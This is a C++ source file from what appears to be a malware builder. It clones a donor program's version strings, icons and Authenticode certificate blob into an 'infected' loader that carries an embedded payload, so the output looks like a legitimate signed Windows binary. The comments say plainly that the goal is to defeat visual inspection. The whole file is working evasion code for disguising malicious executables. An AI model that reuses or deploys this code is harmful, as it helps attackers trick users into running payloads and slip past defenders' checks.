/*
 * CloneMeta.cpp - PE identity cloning (VERSIONINFO, icon, Authenticode cert directory)
 *
 * CloneMeta_Apply copies three cosmetic attributes from a donor PE into the
 * already-built output loader:
 *
 *   1. RT_VERSION              Explorer "Properties -> Details" tab
 *                              (company, product, version strings)
 *   2. RT_GROUP_ICON + RT_ICON Explorer / taskbar / alt-tab icon
 *   3. WIN_CERTIFICATE blob    Explorer "Properties -> Digital Signatures" shows
 *                              donor's signer.  Get-AuthenticodeSignature returns
 *                              HashMismatch — defeats casual visual inspection only.
 *
 * When --pfx is also given, Phase 12 (SignPeWithPfx) overwrites the cloned cert
 * directory with a real signature.  --pfx wins; VERSIONINFO and icon are preserved.
 *
 * Pipeline position: after BuildInfectedPE (Phase 10), before SignPeWithPfx (Phase 12).
 * BeginUpdateResource in Phase 10 rewrites .rsrc entirely — anything written earlier
 * would be lost.  SignPeWithPfx recalculates CheckSum and rewrites SECURITY directory,
 * so a cloned cert written after signing would invalidate the real signature.
 */
#include "CloneMeta.h"
#include "..\Engine\PeBuilder.h"

#include <Windows.h>
#include <imagehlp.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "imagehlp.lib")

/* ── Icon group resource structures ──────────────────────────────────────────
 * Standard Windows resource-section layout for RT_GROUP_ICON.
 * GRPICONDIR  (6 bytes) is the directory header.
 * GRPICONDIRENTRY (14 bytes each) follows idCount times; nId references the
 * corresponding RT_ICON resource entry by integer ID. */
#pragma pack(push, 1)
typedef struct { WORD idReserved; WORD idType; WORD idCount; } GRPICONDIR;
typedef struct {
    BYTE  bWidth;
    BYTE  bHeight;
    BYTE  bColorCount;
    BYTE  bReserved;
    WORD  wPlanes;
    WORD  wBitCount;
    DWORD dwBytesInRes;
    WORD  nId;
} GRPICONDIRENTRY;
#pragma pack(pop)

/* ── Callback context types ──────────────────────────────────────────────────*/
#define MAX_LANG_IDS 32

typedef struct { LANGID ids[MAX_LANG_IDS]; WORD count; } LANG_COLLECT_CTX;
/* Tracks the chosen icon group across the enum callback.
 * Integer IDs (MAKEINTRESOURCE) are stored as WORD; string names are copied
 * into name[] during the callback because the lpszName pointer in EnumResourceNamesA
 * points to a temporary ANSI conversion buffer that is freed on callback return. */
#define MAX_ICON_NAME_LEN 256
typedef struct {
    BOOL found;
    BOOL multiple;
    BOOL isIntId;
    WORD id;
    char name[MAX_ICON_NAME_LEN];
} ICON_GROUP_CTX;

static BOOL CALLBACK CollectLangIds(
    HMODULE hMod, LPCSTR lpszType, LPCSTR lpszName, WORD wLang, LONG_PTR lParam)
{
    (void)hMod; (void)lpszType; (void)lpszName;
    LANG_COLLECT_CTX* ctx = (LANG_COLLECT_CTX*)lParam;
    if (ctx->count < MAX_LANG_IDS) ctx->ids[ctx->count++] = wLang;
    return TRUE;
}

static BOOL CALLBACK CollectFirstIconGroup(
    HMODULE hMod, LPCSTR lpszType, LPSTR lpszName, LONG_PTR lParam)
{
    (void)hMod; (void)lpszType;
    ICON_GROUP_CTX* ctx    = (ICON_GROUP_CTX*)lParam;
    BOOL            curInt = IS_INTRESOURCE(lpszName);
    WORD            curId  = curInt ? (WORD)(ULONG_PTR)lpszName : 0;

    if (!ctx->found) {
        ctx->found   = TRUE;
        ctx->isIntId = curInt;
        if (curInt) {
            ctx->id = curId;
        } else {
            /* String name: copy now while lpszName is still valid. */
            strncpy_s(ctx->name, sizeof(ctx->name), lpszName, _TRUNCATE);
        }
    } else {
        ctx->multiple = TRUE;
        if (curInt) {
            if (!ctx->isIntId) {
                /* Prefer integer ID over string: Explorer picks the lowest integer. */
                ctx->isIntId = TRUE;
                ctx->id      = curId;
            } else if (curId < ctx->id) {
                ctx->id = curId;
            }
        }
    }
    return TRUE;
}

/* ── CloneMeta_CopyResources ─────────────────────────────────────────────────
 * Copies RT_VERSION (all language IDs) and RT_GROUP_ICON + referenced RT_ICON
 * entries from donor into target via BeginUpdateResource/UpdateResource.
 *
 * The donor's RT_RCDATA is intentionally NOT copied — it would overwrite the
 * payload RT_RCDATA entry that BuildInfectedPE (Phase 10) just embedded.
 *
 * Soft failures: missing RT_VERSION or RT_GROUP_ICON → warning + continue.
 * Hard failures: resource API errors → error code returned.             */
static int CloneMeta_CopyResources(const char* targetPath, const char* donorPath)
{
    HMODULE hDonor  = NULL;
    HANDLE  hUpdate = NULL;
    int     ret     = 0;

    /* LOAD_LIBRARY_AS_DATAFILE maps the PE as a flat file without DLL initialization.
     * Do NOT add LOAD_LIBRARY_AS_IMAGE_RESOURCE: on system files (explorer.exe etc.)
     * the image-resource mode activates MUI redirection, which sends RT_GROUP_ICON
     * lookups to the language satellite (.mui) that contains no icons — returning 0
     * results from EnumResourceNamesA.  Flat/datafile mode reads directly from the
     * binary and bypasses MUI, so icon groups are found correctly. */
    hDonor = LoadLibraryExA(donorPath, NULL, LOAD_LIBRARY_AS_DATAFILE);
    if (!hDonor) {
        fprintf(stderr, "[-] CloneMeta: cannot load donor as data file (LastError=%lu)\n", GetLastError());
        return 101;
    }

    /* FALSE = merge with existing resources, preserving .rsrc payload entry. */
    hUpdate = BeginUpdateResourceA(targetPath, FALSE);
    if (!hUpdate) {
        fprintf(stderr, "[-] CloneMeta: BeginUpdateResource failed (LastError=%lu)\n", GetLastError());
        ret = 103;
        goto cleanup;
    }

    /* ---- RT_VERSION: enumerate all language IDs present in donor ---- */
    {
        LANG_COLLECT_CTX ctx = {{0}, 0};
        WORD i;
        /* RT_* macros expand to LPWSTR in Unicode builds; cast to LPCSTR for *A variants. */
        EnumResourceLanguagesA(hDonor, (LPCSTR)RT_VERSION, MAKEINTRESOURCEA(1), CollectLangIds, (LONG_PTR)&ctx);
        if (ctx.count == 0) {
            fprintf(stderr, "[!] warning: donor has no RT_VERSION - version info not cloned\n");
        } else {
            for (i = 0; i < ctx.count; i++) {
                HRSRC   hRsrc = FindResourceExA(hDonor, (LPCSTR)RT_VERSION, MAKEINTRESOURCEA(1), ctx.ids[i]);
                HGLOBAL hRes  = hRsrc ? LoadResource(hDonor, hRsrc) : NULL;
                LPVOID  pData = hRes  ? LockResource(hRes) : NULL;
                DWORD   nSize = hRsrc ? SizeofResource(hDonor, hRsrc) : 0;
                if (!pData || nSize == 0) continue;
                if (!UpdateResourceA(hUpdate, (LPCSTR)RT_VERSION, MAKEINTRESOURCEA(1), ctx.ids[i], pData, nSize)) {
                    fprintf(stderr, "[-] CloneMeta: UpdateResource(RT_VERSION) failed (LastError=%lu)\n", GetLastError());
                    ret = 104;
                    goto cleanup;
                }
            }
        }
    }

    /* ---- RT_GROUP_ICON + RT_ICON: pick lowest-ID group, copy its icons ----
     *
     * FindResourceA uses LANG_NEUTRAL which, for LOAD_LIBRARY_AS_DATAFILE modules,
     * fails with ERROR_RESOURCE_NAME_NOT_FOUND (1813) even when the name exists —
     * the neutral-language fallback logic is broken in datafile mode.
     * Fix: EnumResourceLanguagesA to get the actual LANGID, then FindResourceExA
     * with that exact ID.  Same pattern as the RT_VERSION block above. */
    {
        ICON_GROUP_CTX   gCtx        = {FALSE, FALSE, FALSE, 0, {0}};
        LANG_COLLECT_CTX grpLangCtx  = {{0}, 0};
        LANG_COLLECT_CTX icLangCtx   = {{0}, 0};
        HRSRC            hGrpRsrc;
        HGLOBAL          hGrpGlob;
        LPVOID           pGrpData;
        DWORD            nGrpSize;
        GRPICONDIR*      pDir;
        GRPICONDIRENTRY* pEntries;
        WORD             nIcons, j;
        LPCSTR           grpResName;
        LANGID           grpLangId;

        EnumResourceNamesA(hDonor, (LPCSTR)RT_GROUP_ICON, CollectFirstIconGroup, (LONG_PTR)&gCtx);
        if (!gCtx.found) {
            fprintf(stderr, "[!] warning: donor has no RT_GROUP_ICON - icon not cloned\n");
        } else {
            if (gCtx.multiple)
                fprintf(stderr, "[!] warning: donor has multiple icon groups - using %s\n",
                        gCtx.isIntId ? "lowest integer ID" : "first string name");

            grpResName = gCtx.isIntId ? MAKEINTRESOURCEA(gCtx.id) : gCtx.name;

            /* Resolve the actual language ID for this icon group entry. */
            EnumResourceLanguagesA(hDonor, (LPCSTR)RT_GROUP_ICON, grpResName,
                                   CollectLangIds, (LONG_PTR)&grpLangCtx);
            grpLangId  = grpLangCtx.count > 0
                         ? grpLangCtx.ids[0]
                         : MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL);

            hGrpRsrc = FindResourceExA(hDonor, (LPCSTR)RT_GROUP_ICON, grpResName, grpLangId);
            hGrpGlob = hGrpRsrc ? LoadResource(hDonor, hGrpRsrc) : NULL;
            pGrpData = hGrpGlob ? LockResource(hGrpGlob) : NULL;
            nGrpSize = hGrpRsrc ? SizeofResource(hDonor, hGrpRsrc) : 0;

            if (!pGrpData || nGrpSize < sizeof(GRPICONDIR)) {
                fprintf(stderr, "[!] warning: donor icon group data invalid "
                        "(hRsrc=%p hGlob=%p pData=%p size=%lu err=%lu) - icon not cloned\n",
                        (void*)hGrpRsrc, (void*)hGrpGlob, pGrpData, nGrpSize, GetLastError());
            } else {
                pDir     = (GRPICONDIR*)pGrpData;
                pEntries = (GRPICONDIRENTRY*)(pDir + 1);
                nIcons   = pDir->idCount;

                if (nGrpSize < sizeof(GRPICONDIR) + (DWORD)nIcons * sizeof(GRPICONDIRENTRY)) {
                    fprintf(stderr, "[!] warning: icon group size inconsistent - icon not cloned\n");
                } else {
                    for (j = 0; j < nIcons; j++) {
                        LPCSTR icName = MAKEINTRESOURCEA(pEntries[j].nId);
                        LANGID icLangId;
                        HRSRC   hIcRsrc;
                        HGLOBAL hIcGlob;
                        LPVOID  pIcData;
                        DWORD   nIcSize;

                        icLangCtx.count = 0;
                        EnumResourceLanguagesA(hDonor, (LPCSTR)RT_ICON, icName,
                                               CollectLangIds, (LONG_PTR)&icLangCtx);
                        icLangId = icLangCtx.count > 0
                                   ? icLangCtx.ids[0]
                                   : MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL);

                        hIcRsrc = FindResourceExA(hDonor, (LPCSTR)RT_ICON, icName, icLangId);
                        hIcGlob = hIcRsrc ? LoadResource(hDonor, hIcRsrc) : NULL;
                        pIcData = hIcGlob ? LockResource(hIcGlob) : NULL;
                        nIcSize = hIcRsrc ? SizeofResource(hDonor, hIcRsrc) : 0;
                        if (!pIcData || nIcSize == 0) continue;
                        if (!UpdateResourceA(hUpdate, (LPCSTR)RT_ICON, icName,
                                             MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), pIcData, nIcSize)) {
                            fprintf(stderr, "[-] CloneMeta: UpdateResource(RT_ICON id=%u) failed (LastError=%lu)\n",
                                    (unsigned)pEntries[j].nId, GetLastError());
                            ret = 104;
                            goto cleanup;
                        }
                    }
                    if (!UpdateResourceA(hUpdate, (LPCSTR)RT_GROUP_ICON, grpResName,
                                         MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), pGrpData, nGrpSize)) {
                        fprintf(stderr, "[-] CloneMeta: UpdateResource(RT_GROUP_ICON) failed (LastError=%lu)\n", GetLastError());
                        ret = 104;
                        goto cleanup;
                    }
                }
            }
        }
    }

    /* FALSE = commit changes (TRUE would discard). */
    if (!EndUpdateResource(hUpdate, FALSE)) {
        fprintf(stderr, "[-] CloneMeta: EndUpdateResource failed (LastError=%lu)\n", GetLastError());
        hUpdate = NULL;
        ret = 104;
        goto cleanup;
    }
    hUpdate = NULL;

cleanup:
    /* TRUE = discard: only reached on error paths where EndUpdateResource wasn't called. */
    if (hUpdate) EndUpdateResource(hUpdate, TRUE);
    if (hDonor)  FreeLibrary(hDonor);
    return ret;
}

/* ── CloneMeta_CopyCertDirectory ─────────────────────────────────────────────
 * Copies the WIN_CERTIFICATE blob from donor's SECURITY directory to the end of
 * target, then patches target's IMAGE_DIRECTORY_ENTRY_SECURITY and recalculates
 * the PE checksum.
 *
 * The cert directory uses file offsets (not RVAs) — the only PE data directory
 * where VirtualAddress is a raw file offset.
 *
 * File handle is closed before MapFileAndCheckSumA so the function uses its own
 * handle internally without sharing conflicts; then re-opened briefly to write
 * the computed checksum.
 *
 * Soft failure: donor has no SECURITY directory -> warning + return 0.
 * Hard failures: I/O errors, invalid PE, checksum failure -> error code.  */
static int CloneMeta_CopyCertDirectory(const char* targetPath, const char* donorPath)
{
    /* All variables declared before first goto to avoid C++ jump-over-init errors. */
    BYTE*                donorBuf    = NULL;
    DWORD                donorSize   = 0;
    BYTE*                certBlob    = NULL;
    DWORD                certBlobSize = 0;
    HANDLE               hTarget     = INVALID_HANDLE_VALUE;
    int                  ret         = 0;
    DWORD                secOff      = 0;
    DWORD                secSize     = 0;
    DWORD                tgtFileSize = 0;
    DWORD                padding     = 0;
    DWORD                certFOff    = 0;
    DWORD                secDirFOff  = 0;
    DWORD                cksumFOff   = 0;
    DWORD                written     = 0;
    DWORD                headerSum   = 0;
    DWORD                checkSum    = 0;
    DWORD                hdrRead     = 0;
    DWORD                tgtNtOff    = 0;
    IMAGE_DATA_DIRECTORY secEntry    = {0};
    BYTE                 hdrBuf[0x400] = {0};
    BYTE                 zeroPad[8]    = {0};

    /* ---- Read donor file, locate SECURITY directory ---- */
    if (!ReadFileToBuffer(donorPath, &donorBuf, &donorSize)) {
        fprintf(stderr, "[-] CloneMeta: cannot read donor file\n");
        return 101;
    }

    {
        /* Validate donor PE and extract cert blob. Local vars are scoped here so
         * goto cleanup (jumping out of this block) doesn't bypass function-level inits. */
        PIMAGE_DOS_HEADER pDos;
        DWORD             lfanew;
        WORD              magic;

        if (donorSize < sizeof(IMAGE_DOS_HEADER)) goto donor_not_pe;
        pDos = (PIMAGE_DOS_HEADER)donorBuf;
        if (pDos->e_magic != IMAGE_DOS_SIGNATURE) goto donor_not_pe;
        lfanew = pDos->e_lfanew;

        /* Need at least signature + file header + optional header magic (2 B). */
        if (lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + 2 > donorSize) goto donor_not_pe;
        magic = *(WORD*)(donorBuf + lfanew + 4 + sizeof(IMAGE_FILE_HEADER));

        if (magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
            PIMAGE_NT_HEADERS64 pNt;
            if (lfanew + sizeof(IMAGE_NT_HEADERS64) > donorSize) goto donor_not_pe;
            pNt = (PIMAGE_NT_HEADERS64)(donorBuf + lfanew);
            if (pNt->Signature != IMAGE_NT_SIGNATURE) goto donor_not_pe;
            secOff  = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress;
            secSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size;
        } else if (magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
            PIMAGE_NT_HEADERS32 pNt;
            if (lfanew + sizeof(IMAGE_NT_HEADERS32) > donorSize) goto donor_not_pe;
            pNt = (PIMAGE_NT_HEADERS32)(donorBuf + lfanew);
            if (pNt->Signature != IMAGE_NT_SIGNATURE) goto donor_not_pe;
            secOff  = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress;
            secSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size;
        } else {
            goto donor_not_pe;
        }
        goto donor_pe_ok;

    donor_not_pe:
        fprintf(stderr, "[-] CloneMeta: donor is not a valid PE\n");
        ret = 102;
        goto cleanup;

    donor_pe_ok:;
    }

    if (secSize == 0) {
        /* Donor has no Authenticode signature — soft failure, cert clone skipped. */
        fprintf(stderr, "[!] warning: donor has no Authenticode signature - cert directory not cloned\n");
        goto cleanup;  /* ret stays 0 — this is a successful no-op */
    }
    if ((DWORD64)secOff + secSize > (DWORD64)donorSize) {
        fprintf(stderr, "[-] CloneMeta: donor SECURITY directory extends beyond end of file\n");
        ret = 102;
        goto cleanup;
    }

    certBlob = (BYTE*)HeapAlloc(GetProcessHeap(), 0, secSize);
    if (!certBlob) {
        fprintf(stderr, "[-] CloneMeta: out of memory for cert blob\n");
        ret = 105;
        goto cleanup;
    }
    memcpy(certBlob, donorBuf + secOff, secSize);
    certBlobSize = secSize;

    HeapFree(GetProcessHeap(), 0, donorBuf);
    donorBuf = NULL;

    /* ---- Open target, read its PE headers to locate checksum + SECURITY offsets ---- */
    hTarget = CreateFileA(targetPath, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                          OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hTarget == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] CloneMeta: cannot open target file (LastError=%lu)\n", GetLastError());
        ret = 105;
        goto cleanup;
    }

    SetFilePointer(hTarget, 0, NULL, FILE_BEGIN);
    if (!ReadFile(hTarget, hdrBuf, sizeof(hdrBuf), &hdrRead, NULL) || hdrRead < sizeof(IMAGE_DOS_HEADER)) {
        fprintf(stderr, "[-] CloneMeta: failed to read target PE headers\n");
        ret = 105;
        goto cleanup;
    }

    {
        /* Parse target headers to compute file offsets. Target is always x64
         * (Stub is x64-only), so IMAGE_NT_HEADERS64 is used unconditionally. */
        PIMAGE_DOS_HEADER   pTgtDos;
        PIMAGE_NT_HEADERS64 pTgtNt;

        pTgtDos = (PIMAGE_DOS_HEADER)hdrBuf;
        if (pTgtDos->e_magic != IMAGE_DOS_SIGNATURE) {
            fprintf(stderr, "[-] CloneMeta: target has corrupt DOS header\n");
            ret = 105;
            goto cleanup;
        }
        tgtNtOff = pTgtDos->e_lfanew;
        if (tgtNtOff + sizeof(IMAGE_NT_HEADERS64) > hdrRead) {
            fprintf(stderr, "[-] CloneMeta: target NT headers outside header buffer\n");
            ret = 105;
            goto cleanup;
        }
        pTgtNt = (PIMAGE_NT_HEADERS64)(hdrBuf + tgtNtOff);
        if (pTgtNt->Signature != IMAGE_NT_SIGNATURE ||
            pTgtNt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
            fprintf(stderr, "[-] CloneMeta: target is not an x64 PE\n");
            ret = 105;
            goto cleanup;
        }

        /* Use offsetof so we don't rely on hardcoded byte offsets. */
        secDirFOff = tgtNtOff
            + (DWORD)offsetof(IMAGE_NT_HEADERS64, OptionalHeader)
            + (DWORD)offsetof(IMAGE_OPTIONAL_HEADER64, DataDirectory)
            + IMAGE_DIRECTORY_ENTRY_SECURITY * (DWORD)sizeof(IMAGE_DATA_DIRECTORY);

        cksumFOff = tgtNtOff
            + (DWORD)offsetof(IMAGE_NT_HEADERS64, OptionalHeader)
            + (DWORD)offsetof(IMAGE_OPTIONAL_HEADER64, CheckSum);
    }

    /* ---- Pad target to 8-byte alignment, append cert blob ---- */
    tgtFileSize = GetFileSize(hTarget, NULL);
    if (tgtFileSize == INVALID_FILE_SIZE) {
        fprintf(stderr, "[-] CloneMeta: GetFileSize failed (LastError=%lu)\n", GetLastError());
        ret = 105;
        goto cleanup;
    }
    padding  = (8 - (tgtFileSize % 8)) % 8;
    certFOff = tgtFileSize + padding;

    if (padding > 0) {
        SetFilePointer(hTarget, 0, NULL, FILE_END);
        if (!WriteFile(hTarget, zeroPad, padding, &written, NULL) || written != padding) {
            fprintf(stderr, "[-] CloneMeta: alignment padding write failed (LastError=%lu)\n", GetLastError());
            ret = 105;
            goto cleanup;
        }
    }

    SetFilePointer(hTarget, 0, NULL, FILE_END);
    written = 0;
    if (!WriteFile(hTarget, certBlob, certBlobSize, &written, NULL) || written != certBlobSize) {
        fprintf(stderr, "[-] CloneMeta: cert blob write failed (LastError=%lu)\n", GetLastError());
        ret = 105;
        goto cleanup;
    }

    /* ---- Patch SECURITY DataDirectory entry ---- */
    secEntry.VirtualAddress = certFOff;
    secEntry.Size           = certBlobSize;
    SetFilePointer(hTarget, secDirFOff, NULL, FILE_BEGIN);
    written = 0;
    if (!WriteFile(hTarget, &secEntry, sizeof(secEntry), &written, NULL) || written != sizeof(secEntry)) {
        fprintf(stderr, "[-] CloneMeta: SECURITY directory patch failed (LastError=%lu)\n", GetLastError());
        ret = 105;
        goto cleanup;
    }

    /* ---- Recalculate PE checksum ----
     * Close our handle first so MapFileAndCheckSumA can open the file with its
     * own handle without sharing conflicts. Re-open briefly after to write the
     * computed value into OptionalHeader.CheckSum. */
    CloseHandle(hTarget);
    hTarget = INVALID_HANDLE_VALUE;

    if (MapFileAndCheckSumA((PSTR)targetPath, &headerSum, &checkSum) != CHECKSUM_SUCCESS) {
        fprintf(stderr, "[-] CloneMeta: MapFileAndCheckSumA failed\n");
        ret = 106;
        goto cleanup;
    }

    hTarget = CreateFileA(targetPath, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                          OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hTarget == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] CloneMeta: cannot re-open target to write checksum (LastError=%lu)\n", GetLastError());
        ret = 106;
        goto cleanup;
    }
    SetFilePointer(hTarget, cksumFOff, NULL, FILE_BEGIN);
    written = 0;
    if (!WriteFile(hTarget, &checkSum, sizeof(DWORD), &written, NULL) || written != sizeof(DWORD)) {
        fprintf(stderr, "[-] CloneMeta: checksum write failed (LastError=%lu)\n", GetLastError());
        ret = 106;
        goto cleanup;
    }

cleanup:
    if (hTarget != INVALID_HANDLE_VALUE) CloseHandle(hTarget);
    if (certBlob) HeapFree(GetProcessHeap(), 0, certBlob);
    if (donorBuf) HeapFree(GetProcessHeap(), 0, donorBuf);
    return ret;
}

/* ── CloneMeta_Apply (public) ────────────────────────────────────────────────
 * Calls the two helpers in sequence. CopyResources runs first so that icon
 * and version data land in .rsrc before the cert blob is appended. */
int CloneMeta_Apply(const char* targetPath, const char* donorPath)
{
    int r;
    if (!targetPath || !donorPath) return 101;
    r = CloneMeta_CopyResources(targetPath, donorPath);
    if (r != 0) return r;
    return CloneMeta_CopyCertDirectory(targetPath, donorPath);
}
